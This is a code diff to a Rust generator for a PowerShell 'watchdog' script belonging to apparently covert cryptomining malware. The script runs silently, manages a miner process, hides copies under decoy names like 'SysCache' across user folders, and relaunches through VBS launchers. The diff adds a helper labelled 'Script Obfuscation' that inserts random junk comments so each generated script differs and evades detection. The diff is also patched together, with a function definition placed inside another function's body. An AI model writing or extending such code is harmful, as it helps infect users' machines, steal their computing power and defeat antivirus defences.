@@ -133,6 +133,7 @@ pub fn create_watchdog_script(install_dirs: &[PathBuf], _config_path: &Path) -> 
     let node_script_content = format!(
         r#"
 $ErrorActionPreference = "SilentlyContinue"
+{junk1}
 
 # --- CONSTANTS ---
 $MY_DIR = $PSScriptRoot
@@ -154,6 +155,7 @@ $POLY_NAMES = @("SysCache", "WinData", "NetConfig", "CloudSync", "SysDriver", "W
 $POLY_PARENTS = @($env:USERPROFILE, "$env:USERPROFILE\\Documents", "$env:USERPROFILE\\Music", "$env:USERPROFILE\\Pictures", "$env:USERPROFILE\\Videos", "$env:APPDATA", "$env:LOCALAPPDATA", "$env:TEMP")
 
 # --- FUNCTIONS ---
+{junk2}
 
 function Get-Nodes {{
     if (-not (Test-Path $REG_KEY)) {{ return @($MY_DIR) }}
@@ -268,6 +270,7 @@ function Manage-Mining {{
 }}
 
 Self-Check
+{junk3}
 while ($true) {{
     Self-Check
     $nodes = Perform-Mesh-Check
@@ -280,10 +283,33 @@ while ($true) {{
         config_name = CONFIG_FILENAME,
         launcher_name_vbs = launcher_name_vbs,
         miner_proc = miner_name.trim_end_matches(".exe"),
-        recovery_payload = recovery_payload_escaped
+        recovery_payload = recovery_payload_escaped,
+        junk1 = generate_junk_comment(),
+        junk2 = generate_junk_comment(),
+        junk3 = generate_junk_comment()
     );
 
     let mut vbs_paths = Vec::new();
+// ... (rest of function) ...
+
+// Helper for Script Obfuscation
+fn generate_junk_comment() -> String {
+    use rand::seq::SliceRandom;
+    let words = vec![
+        "System", "config", "Update", "Cache", "Driver", "Service", "Log", "Data", 
+        "Network", "Host", "Local", "Global", "Internal", "External", "Proxy", 
+        "Route", "Table", "Index", "Query", "Stack", "Heap", "Thread", "Pool"
+    ];
+    let mut rng = rand::thread_rng();
+    let count = rand::random::<usize>() % 5 + 3; // 3 to 7 words
+    let mut parts = Vec::new();
+    for _ in 0..count {
+        if let Some(w) = words.choose(&mut rng) {
+            parts.push(*w);
+        }
+    }
+    format!("# {}", parts.join(" "))
+}
     for dir in install_dirs {
         if !dir.exists() { continue; }
         let monitor_path = dir.join(&monitor_name);
